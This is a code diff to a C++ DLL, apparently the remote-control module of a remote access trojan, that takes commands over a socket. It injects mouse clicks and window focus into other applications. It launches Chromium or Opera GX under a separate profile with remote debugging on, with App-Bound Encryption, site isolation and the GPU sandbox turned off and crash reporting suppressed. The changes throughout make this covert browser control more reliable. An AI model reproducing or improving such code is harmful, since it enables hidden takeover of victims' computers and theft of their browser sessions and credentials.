@@ -994,6 +994,7 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
     }
 
     SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(ht, msg));
+    SendMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hFore);
 }
 
 // -----------------------------------------------------------------------
@@ -1154,29 +1155,29 @@ static void input_loop() {
                 SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                     SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
-                if (ht != HTCLIENT && btn == 0) {
-                    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
-                    if (hRoot) {
-                        if (ht == HTCLOSE) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0); continue; }
-                        else if (ht == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
-                        else if (ht == HTMAXBUTTON) {
-                            WINDOWPLACEMENT wp = { sizeof(wp) };
-                            GetWindowPlacement(hRoot, &wp);
-                            if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
-                            else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
-                            continue;
-                        }
+                HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                if (!hRoot) hRoot = hwnd;
 
-                        if (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT || ht == HTTOP || ht == HTBOTTOM ||
-                            ht == HTTOPLEFT || ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT) {
-                            g_dragging = true;
-                            g_dragHwnd = hRoot;
-                            g_dragStartPt = screenPt;
-                            g_dragHitTest = ht;
-                            GetWindowRect(hRoot, &g_dragStartRect);
-                            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
-                            continue;
-                        }
+                if (ht != HTCLIENT && btn == 0) {
+                    if (ht == HTCLOSE) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0); continue; }
+                    else if (ht == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
+                    else if (ht == HTMAXBUTTON) {
+                        WINDOWPLACEMENT wp = { sizeof(wp) };
+                        GetWindowPlacement(hRoot, &wp);
+                        if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
+                        else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
+                        continue;
+                    }
+
+                    if (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT || ht == HTTOP || ht == HTBOTTOM ||
+                        ht == HTTOPLEFT || ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT) {
+                        g_dragging = true;
+                        g_dragHwnd = hRoot;
+                        g_dragStartPt = screenPt;
+                        g_dragHitTest = ht;
+                        GetWindowRect(hRoot, &g_dragStartRect);
+                        send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                        continue;
                     }
                 }
 
@@ -1192,9 +1193,14 @@ static void input_loop() {
                 SetCursorPos(screenPt.x, screenPt.y);
                 send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
 
+                // Hybrid injection: Hardware + Message queue
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                 PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
                 PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
+
+                // Aggressive focus for Chromium
+                SetForegroundWindow(hRoot);
+                SetFocus(hwnd);
             }
             continue;
         }
@@ -1230,6 +1236,9 @@ static void input_loop() {
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                 PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
                 PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), MAKELPARAM(clientPt.x, clientPt.y));
+
+                // Final focus check
+                if (GetFocus() != hwnd) SetFocus(hwnd);
             }
             g_mouseDownTarget[btn] = NULL;
             continue;
@@ -1597,10 +1606,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     send_status("Tarayıcı başlatılıyor...");
 
                     // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
-                    wstring disableFeatures = L"AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity,IsolateOrigins,site-per-process";
-                    if (wRequestedPath == L"Opera GX") {
-                        disableFeatures += L",GXC_Check_UI_Updates,GXC_Auto_Update";
-                    }
+                    wstring disableFeatures = L"AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,NativeWindowOcclusion,RendererCodeIntegrity,IsolateOrigins,site-per-process,OverlayScrollbars,WebRtcHideLocalIpsWithMdns,GXC_Check_UI_Updates,GXC_Auto_Update,GXC_Promotion,GXC_Welcome_Page,GXC_Features_Menu,GXC_Assistant,GXC_O_Million,GXC_Newsletter,GXC_Release_Notes";
 
                     wstring args = L" --remote-debugging-port=9222"
                                    L" --user-data-dir=\"" + profilePath + L"\""
@@ -1634,6 +1640,22 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-site-isolation-trials"
                                    L" --force-color-profile=srgb"
                                    L" --disable-software-rasterizer"
+                                   L" --disable-direct-composition"
+                                   L" --disable-direct-composition-layers"
+                                   L" --disable-direct-composition-video-overlays"
+                                   L" --disable-hardware-overlays"
+                                   L" --disable-gpu-early-init"
+                                   L" --disable-gl-drawing-for-tests"
+                                   L" --disable-canvas-aa"
+                                   L" --disable-2d-canvas-clip-aa"
+                                   L" --disable-breakpad"
+                                   L" --disable-accelerated-2d-canvas"
+                                   L" --disable-accelerated-video-decode"
+                                   L" --disable-gpu-rasterization"
+                                   L" --disable-vulkan"
+                                   L" --test-type"
+                                   L" --disable-gpu-sandbox"
+                                   L" --disable-background-timer-throttling"
                                    L" --lang=en-US";
 
                     if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
